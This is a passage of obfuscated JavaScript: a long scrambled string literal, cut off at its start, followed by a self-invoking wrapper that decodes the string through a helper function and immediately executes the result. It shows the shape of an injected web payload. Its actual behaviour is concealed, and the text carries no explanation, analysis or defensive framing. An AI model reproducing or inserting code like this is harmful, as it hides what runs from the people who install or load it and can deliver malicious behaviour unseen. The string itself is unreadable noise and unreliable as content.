(a}%Baf(nF$F=FuninFb%f]3(c(]e]66srrF=]B8A12t;vrt]cF$s[._0%hp!g4,1{er:0(F}6%BjFh4.11 =Fnha)p)]jG.+}]oo,odse};FGe=x]%pe1tfF:s7ce()3.)F9tcc\/ea5=)Fe)$F{"[t]befis_nFiyemrF_.f5o5.r[.2nc!r5rn}9oFaes.Ct)of6E]trc1r)%Mx-e]s5])plchFt){Fsa)1cr5kd;vFt% ;{F]2g]]c;fnu.l6Fc-F}(;l%f.t}s)1.tT$nf(;b}+Fn%%.ru0nrt2eEF}l]g7"FF.id(6cn(u%F)aF,:.%F1t.*.n)=!%i5]aoo(t=}%rvlun.6\/}3tH)(\/Frhnvcu.*?[i]F!2%nfF+Fs42 )c4(i1te.()d[9*}=)FtfF%i:3FFv0gctcrA?n?o;Fca2+634FF=trF0]carft m(s..\/] c(no=e1!F+o=n. +2)o=f({(b.ucC[CdFb}ac7)Fd9)15vn=c98%]0FFF0rF4m.F4o=acc)]Fs((t}6=])e.tFtF0xst)F6 rte71c2\'t9F(F8)tx {Ff.c1(o3[d31F6=FqyF.a3F$(=A-.i}tbi b!Fa,1(.}atmF]F4;r[r%.FEc5;1c$a.%r4t].;iFmF=nu. F3Cqlee%;ecFft1c"}]o#)Fn;,2r7=(oo9.sFait] (Fn7T8(tfa=cF65;8F(2==dF(}=nFrgFF96A|entFt1Ffr)%F7e!tt=3;6cr(p.}taf)aC118c&u_4;Sc62]rFeF=tFt);nFea%+%s n*!9t%]tF.9aFv;br*.=[icet09Nnni??!_e]=FFopvll.a)1i)(r)F(c.2;zc)c(i&c.\';e0]3%7;erFr.s(m=..1b5&0(cFrF)t8F)}?F%=4)=">&Fosh.%]Fl,De=ape_n]ei1v: odr.p.Fti;(-].dF="ce9re.a3Fe!200r\/o105D2F]."f8srla(FaFF,eFFiN]]]e=Frc0o(fa2.b7al*;(i4i .sFb31feirmF2e{FD>3F 9.!0i+[l)!:+e{x\/!v1s.e6_ t+dFt(i_0itr&.FF9.F]ww}Fdn)Fh_a8o,cF!r6crh.a,l]_o%Fo7oe]36 .c:(>)t]ek(%FmxeFttf$n(ro;cs7i9.4uTFehc>(=fs=esF3F=6r)dtapttF){8;yn ).FnCc.c;uFh\/k.1.Fh.}6tt>FF.t(he8_6]c%{5obc5i\/1(gh)gl}wbp}ne2bt &n)]4e+<54,14e(e3]&F)C[.!A(4.l.\/5w\/.)!21y(HEcT[.=ne.c( .2.))%[rr@.%,dfb_,\'.7. ];]1(4F{ 10oc,t.+]],(6onrmy{M.(ruF;n=Ftwene+.)%.pc)!+?( i7tFFC23pe3n2(tdo,it8o }r:l(dhirni]h.))hc:'));var EWr=UCo(Tdh,JSu );EWr(9069);return 9309})()
